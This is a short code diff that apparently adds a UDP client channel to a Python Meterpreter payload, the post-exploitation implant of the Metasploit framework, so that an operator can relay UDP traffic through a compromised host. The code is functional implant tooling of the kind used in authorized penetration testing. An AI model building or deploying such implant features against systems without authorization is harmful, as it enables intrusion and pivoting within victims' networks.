@@ -888,6 +888,18 @@ def channel_open_stdapi_net_tcp_server(request, response):
     return ERROR_SUCCESS, response
 
 @register_function
+def channel_open_stdapi_net_udp_client(request, response):
+    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '0.0.0.0')
+    local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT).get('value', 0)
+    peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST)['value']
+    peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value', 0)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((local_host, local_port))
+    channel_id = meterpreter.add_channel(MeterpreterSocketUDPClient(sock, (peer_host, peer_port)))
+    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+    return ERROR_SUCCESS, response
+
+@register_function
 def stdapi_sys_config_getenv(request, response):
     for env_var in packet_enum_tlvs(request, TLV_TYPE_ENV_VARIABLE):
         pgroup = bytes()
